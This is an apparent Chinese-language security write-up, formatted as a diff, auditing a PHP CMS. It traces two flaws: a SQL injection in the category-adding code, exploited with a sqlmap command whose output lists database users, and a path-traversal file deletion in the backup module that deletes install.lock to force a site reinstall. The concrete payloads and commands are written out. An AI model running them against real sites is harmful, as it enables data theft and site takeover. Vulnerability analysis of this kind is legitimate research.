@@ -1,0 +1,46 @@
+Prat 0 自白
+每一天都是新的一天。
+没啥吐槽的，步入正题
+/system/category.php 文件一处Sql注入## 80-87行代码
+$root_id = intval(trim( $_POST [ 'root_id' ])); $cate_name = trim( $_POST [ 'cate_name' ]); $cate_dir = trim( $_POST [ 'cate_dir' ]); $cate_url = trim( $_POST [ 'cate_url' ]); $cate_isbest = intval( $_POST [ 'cate_isbest' ]); $cate_order = intval( $_POST [ 'cate_order' ]); $cate_keywords = trim( $_POST [ 'cate_keywords' ]); $cate_description = trim( $_POST [ 'cate_description' ]);
+110-124行代码
+if ( $action == 'saveadd' ) { $query = $DB ->query( "SELECT cate_id FROM $table WHERE root_id='$root_id' AND cate_name='$cate_name'" ); if ( $DB ->num_rows( $query )) { msgbox( '您所添加的分类已存在！' ); } $DB ->insert( $table , $data ); update_categories(); update_cache( 'categories' ); $fileurl = empty ( $root_id ) ? $fileurl .= '?act=add' : $fileurl .= '?act=add&root_id=' . $root_id ; msgbox( '分类添加成功！' , $fileurl ); } elseif ( $action == 'saveedit' ) { $cate_id = intval( $_POST [ 'cate_id' ]); $where = array ( 'cate_id' => $cate_id );
+首先我们需要直到，注意看$cate_name,从POST获取参数然后去掉空格。
+然后$action获取到的参数为saveadd的时候先把$cate_name带入查询。
+判断数据库是否存在这个名字，如果满足条件则进入msgbox('您所添加的分类已存在！');
+没满足条件则添加。
+注意第20行代码，我们可以肯定，他肯定是先通过一次sql语句进行查询。
+漏洞利用
+报错了，没有关系，我们开启mysql监测看一下是否有带入sql查询
+SELECT cate_id FROM dir_categories WHERE root_id= '1' AND cate_name= 'aaaa' and 1 = 1
+考虑到可能会因为时间过长导致cookie失效，所以建议直接使用--tech参数来指定一下注入类型。
+sqlmap -r "/mnt/d/test.txt" -p cate_name --dbms=mysql --random-agent --tech B --users
+结果：
+Parameter: cate_name (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: root_id=1&cate_name=aaaa' AND 6067=6067 AND 'yrhI'='yrhI&cate_dir=aaaa&cate_url=aaaa&cate_keywords=aaaa&cate_description=aaa&cate_order=0&act=saveadd [17:58:46] [INFO] testing MySQL [17:58:46] [INFO] confirming MySQL [17:58:46] [INFO] the back- end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4 .45, Apache 2.4 .23 back- end DBMS: MySQL >= 5.0 .0 [ 17 : 58 : 46 ] [INFO] fetching database users [ 17 : 58 : 46 ] [INFO] fetching number of database users [ 17 : 58 : 46 ] [WARNING] running in a single-thread mode . Please consider usage of option '--threads' for faster data retrieval [ 17 : 58 : 46 ] [INFO] retrieved: 3 [ 17 : 59 : 28 ] [INFO] retrieved: 'root' @ 'localhost' [ 18 : 10 : 25 ] [INFO] retrieved: 'root' @ '127.0.0.1' [ 18 : 22 : 37 ] [INFO] retrieved: 'root' @ '::1' database management system users [ 3 ]: 'root' @ '127.0.0.1' 'root' @ '::1' 'root' @ 'localhost'
+当然，在获取数据的时候也有可能会导致cookie失效，但是后台没有验证码。
+当我们得知后台账号密码的情况下，完全可以造个轮子。
+因为比较懒，就暂时不写poc了。
+/system/database.php 文件一处任意文件删除可导致Cms重装
+156-165行代码
+if ( $action == 'delete' ) { $bakfile = trim( $_GET [ 'file' ]); $filepath = $DBak ->datadir. $bakfile ; if (unlink( $filepath )) { msgbox( '文件删除成功！' , $fileurl . '?act=restore' ); } else { msgbox( '文件删除失败！' ); } }
+OK，我们继续看第158行
+首先他从get获取file参数，然后在去掉两边的空格存入$bakfile中
+然后拼接文件地址，这里用了datadir，我们跟过去看一下。
+public function __construct ( $db_host , $db_user , $db_pass , $db_name , $charset = 'utf8' ) { $this ->connect( $db_host , $db_user , $db_pass , $db_name , $charset ); $this ->datadir = ROOT_PATH. 'data/dbbak/' ; }
+文件成功删除，可能有小伙伴会问了，这没达到任意文件删除的目的。
+这只是删除掉了指定目录的任意文件。
+所以，我们需要删除掉其他目录的文件。
+利用../往上跳目录，例如我想删除根目录的文件就需要跳两次
+payload: system/database.php?act=delete&file=../../a.txt
+OK,可能会有小伙伴会觉得任意文件删除没有啥意义。
+接下来我们继续看。
+install/install.php
+17-19行代码
+if (file_exists(ROOT_PATH. 'data/install.lock' )) { failure( '你已经安装过本系统！<br />如果还继续安装，请先删除data/install.lock，再继续' ); }
+首先在cms重装前，会判断是否有data/install.lock文件，如果有则不进去后面的代码。
+没有则开始进行重装。
+那么我们只需要删除掉data/install就好了
+payload : system/database.php?act=delete&file=../../data/install.lock
+就可以达到重装。
+因为重装会导致站点会瘫痪，所以不建议各位重装，以及删除任何文件。
+>>>>>>黑客入门必备技能 带你入坑，和逗比表哥们一起聊聊黑客的事儿，他们说高精尖的技术比农药都好玩！
